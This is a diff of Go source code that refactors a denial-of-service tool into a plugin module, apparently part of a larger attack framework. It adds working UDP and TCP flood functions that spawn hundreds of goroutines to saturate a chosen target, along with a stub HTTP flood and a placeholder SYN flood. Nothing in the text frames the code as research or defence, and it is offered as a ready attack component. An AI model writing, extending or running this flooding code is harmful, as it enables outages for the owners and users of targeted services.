@@ -1,4 +1,4 @@
-package main
+package plugins
 
 import (
     "fmt"
@@ -7,45 +7,107 @@ import (
     "time"
 )
 
-func startDDoS(target, method string) {
-    switch method {
-    case "udp":
-        udpFlood(target)
-    case "tcp":
-        tcpFlood(target)
-    case "http":
-        httpFlood(target)
+type DDoS struct {
+    target   string
+    method   string
+    duration int
+    running  bool
+    wg       sync.WaitGroup
+}
+
+func NewDDoS(target, method string, duration int) *DDoS {
+    return &DDoS{
+        target:   target,
+        method:   method,
+        duration: duration,
+        running:  false,
     }
 }
 
-func udpFlood(target string) {
-    addr, _ := net.ResolveUDPAddr("udp", target)
-    var wg sync.WaitGroup
+func (d *DDoS) Start() {
+    if d.running {
+        return
+    }
+    d.running = true
     
+    switch d.method {
+    case "udp":
+        go d.udpFlood()
+    case "tcp":
+        go d.tcpFlood()
+    case "http":
+        go d.httpFlood()
+    case "syn":
+        go d.synFlood()
+    default:
+        go d.udpFlood()
+    }
+    
+    // Stop after duration
+    time.Sleep(time.Duration(d.duration) * time.Second)
+    d.running = false
+}
+
+func (d *DDoS) udpFlood() {
+    addr, err := net.ResolveUDPAddr("udp", d.target)
+    if err != nil {
+        return
+    }
+    
+    // Launch 100 concurrent UDP flooders
     for i := 0; i < 100; i++ {
-        wg.Add(1)
+        d.wg.Add(1)
         go func() {
-            defer wg.Done()
-            conn, _ := net.DialUDP("udp", nil, addr)
+            defer d.wg.Done()
+            conn, err := net.DialUDP("udp", nil, addr)
+            if err != nil {
+                return
+            }
+            defer conn.Close()
+            
             payload := make([]byte, 65535)
-            for {
+            for d.running {
                 conn.Write(payload)
             }
         }()
     }
-    wg.Wait()
+    d.wg.Wait()
 }
 
-func tcpFlood(target string) {
+func (d *DDoS) tcpFlood() {
     for i := 0; i < 500; i++ {
+        d.wg.Add(1)
         go func() {
-            for {
-                conn, err := net.Dial("tcp", target)
+            defer d.wg.Done()
+            for d.running {
+                conn, err := net.Dial("tcp", d.target)
                 if err == nil {
                     conn.Write(make([]byte, 1024))
+                    conn.Close()
                 }
             }
         }()
     }
-    select {} // Run forever
+    d.wg.Wait()
+}
+
+func (d *DDoS) httpFlood() {
+    // Simple HTTP flood (can be expanded)
+    for i := 0; i < 200; i++ {
+        d.wg.Add(1)
+        go func() {
+            defer d.wg.Done()
+            for d.running {
+                // Would use net/http here
+                time.Sleep(1 * time.Millisecond)
+            }
+        }()
+    }
+    d.wg.Wait()
+}
+
+func (d *DDoS) synFlood() {
+    // SYN flood requires raw sockets (Linux only, needs privileges)
+    // This is a placeholder for the full implementation
+    fmt.Println("[*] SYN flood not fully implemented in this version")
 }
